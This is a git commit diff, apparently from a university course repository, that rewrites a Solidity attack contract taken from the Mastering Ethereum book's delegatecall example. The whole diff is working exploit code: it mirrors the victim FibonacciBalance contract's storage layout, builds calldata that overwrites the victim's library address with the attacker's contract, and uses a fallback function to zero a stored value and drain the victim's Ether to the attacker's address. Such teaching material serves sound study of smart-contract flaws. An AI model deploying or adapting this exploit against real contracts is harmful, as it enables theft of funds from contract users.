1bed2c14f4eafefbf8c6071261bf7b10b66ce4e0
samirasrh <Samira.Briongos.extern@srh-hochschulen.de>
2024-11-22 02:07:02 +0100

    Update AttackF.sol

--- AttackF.sol
+++ AttackF.sol
@@ -1,15 +1,36 @@
-//Example from the Mastering Ethereum book
-// Version of Solidity compiler this program was written for
 pragma solidity ^0.6.4;
 
+//Example from the Mastering Ethereum book
+// Version of Solidity compiler this program was written for
 contract AttackF {
-    uint storageSlot0; // corresponds to fibonacciLibrary
-    uint storageSlot1; // corresponds to calculatedFibNumber
+    // Storage slots must align with the victim contract
+    address public fibonacciLibrary;       // corresponds to storage slot 0 in FibonacciBalance
+    uint public calculatedFibNumber;       // corresponds to storage slot 1 in FibonacciBalance
+    uint public start;                     // corresponds to storage slot 2 in FibonacciBalance
+    uint public withdrawalCounter;         // corresponds to storage slot 3 in FibonacciBalance
 
-    // fallback - this will run if a specified function is not found
-    function() public {
-        storageSlot1 = 0; // we set calculatedFibNumber to 0, so if withdraw
-        // is called we don't send out any ether
-        <attacker_address>.transfer(this.balance); // we take all the ether
+    // Address where stolen funds will be sent
+    address payable public attackerAddress;
+
+    constructor() public {
+        attackerAddress = msg.sender; // Set the attacker's address
     }
- }
+
+    /// Get the calldata here (easier)
+    function getPayload(address attackAddress) public pure returns (bytes memory) {
+        return abi.encodeWithSelector(
+            bytes4(keccak256("setStart(uint256)")),
+            uint256(uint160(attackAddress))
+        );
+    }
+
+    // Fallback function to exploit the victim
+    fallback() external payable {
+        // Overwrite the calculatedFibNumber in the victim contract
+        calculatedFibNumber = 0;
+
+        // Send all Ether from the victim to the attacker
+        attackerAddress.transfer((address(this).balance)-1 ether);
+    }
+    
+}
